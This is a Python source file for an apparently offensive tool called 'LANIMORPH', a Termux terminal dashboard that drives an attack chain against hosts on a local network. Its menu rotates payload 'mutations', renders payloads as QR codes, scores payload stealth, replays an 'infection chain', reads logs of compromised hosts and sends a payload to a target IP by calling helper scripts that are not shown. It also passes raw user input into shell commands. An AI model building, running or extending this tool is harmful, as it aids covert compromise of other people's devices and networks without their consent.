#!/usr/bin/env python3
import os
import time
import socket
from pathlib import Path

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("192.168.1.45", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "unknown"

def get_current_mutation():
    vault_path = "/data/data/com.termux/files/usr/tmp/vault_drop.txt"
    if os.path.exists(vault_path):
        return Path(vault_path).read_text().strip().splitlines()[0]
    return "(none)"

def get_last_injection():
    log_path = os.path.expanduser("~/LANIMORPH/chain/inject_silent.log")
    if not os.path.exists(log_path): return "(none)"
    with open(log_path) as f:
        lines = [l.strip() for l in f if "silent: Host compromised" in l]
    return lines[-1] if lines else "(none)"

def show_qr_payload():
    vault = "/data/data/com.termux/files/usr/tmp/vault_drop.txt"
    if not os.path.isfile(vault):
        print("[x] Vault mutation file not found.")
        input("[Enter] to continue...")
        return

    print("[~] Generating QR code for current mutation...\n")
    try:
        if os.system("which qrencode > /dev/null 2>&1") == 0:
            os.system(f"qrencode -t ansiutf8 < {vault}")
        else:
            try:
                import qrcode
            except ImportError:
                os.system("pip install qrcode[pil]")
                import qrcode

            payload = Path(vault).read_text().strip()
            qr = qrcode.QRCode(border=1)
            qr.add_data(payload)
            qr.make(fit=True)
            qr.print_ascii(invert=True)
    except Exception as e:
        print(f"[x] QR generation error: {e}")
    input("\n[Enter] to continue...")

def run_heatmap():
    os.system("python3 ~/LANIMORPH/chain/lan_heatmap_draw.py")
    input("\n[Enter] to continue...")

def open_flyer():
    os.system("bash ~/LANIMORPH/chain/lan_flyer_trigger.sh")
    input("\n[Enter] to continue...")

def replay_chain():
    os.system("python3 ~/LANIMORPH/chain/lan_chain_replay_engine.py")
    input("\n[Enter] to continue...")

def score_stealth():
    path = input("[?] Path to payload: ").strip()
    os.system(f"bash ~/LANIMORPH/chain/lan_stealth_scorer.sh {path}")
    input("\n[Enter] to continue...")

def rotate_mutation():
    os.system("bash ~/LANIMORPH/chain/lan_mutation_vault_rotator.sh")
    input("\n[Enter] to continue...")

def inject_payload():
    ip = input("[?] Target IP: ").strip()
    os.system(f"python3 ~/LANIMORPH/chain/lan_chain_send.py {ip}")
    input("\n[Enter] to continue...")

def print_dashboard():
    os.system("clear")
    print("="*60)
    print("🧠  LANIMORPH :: LIVE OPERATION DASHBOARD")
    print("="*60)
    print(f"[+] Local IP            : {get_local_ip()}")
    print(f"[+] Current Mutation    : {get_current_mutation()}")
    print(f"[+] Last Injection      : {get_last_injection()}")
    print(f"[+] Time                : {time.strftime('%H:%M:%S')}")
    print("="*60)
    print("Choose an option:\n")
    print(" [1] Rotate mutation vault")
    print(" [2] QR payload swarm (show in terminal)")
    print(" [3] Run LAN heatmap")
    print(" [4] Open stealth flyer")
    print(" [5] Replay infection chain")
    print(" [6] Score payload stealth (AI)")
    print(" [7] Inject payload to IP")
    print(" [0] Exit\n")

def main():
    while True:
        print_dashboard()
        try:
            choice = input(">> ").strip()
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
            break

        if choice == "1": rotate_mutation()
        elif choice == "2": show_qr_payload()
        elif choice == "3": run_heatmap()
        elif choice == "4": open_flyer()
        elif choice == "5": replay_chain()
        elif choice == "6": score_stealth()
        elif choice == "7": inject_payload()
        elif choice == "0": break
        else:
            input("[x] Invalid. Press Enter to continue.")

if __name__ == "__main__":
    main()
